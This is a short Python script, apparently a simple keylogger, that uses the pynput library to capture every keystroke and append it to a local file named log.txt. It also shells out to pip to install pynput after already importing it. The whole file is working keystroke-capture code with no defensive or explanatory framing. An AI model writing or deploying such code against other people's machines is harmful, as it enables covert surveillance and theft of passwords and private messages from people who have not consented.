from os import system
from pynput.keyboard import Listener
system("pip3 install pynput")
def write_to_file(key):
	letter = str(key)
	letter = letter.replace("'", "")

	if letter == "Key.space":
		letter = " "
	if letter == "Key.shift":
		letter = ''
	if letter == 'Key.enter':
			letter = "\n"
	if letter == "Key.ctrl":
		letter = '^'
	
	with open("log.txt", 'a') as f:
		f.write(letter)
with Listener(on_press=write_to_file) as l:
	l.join()
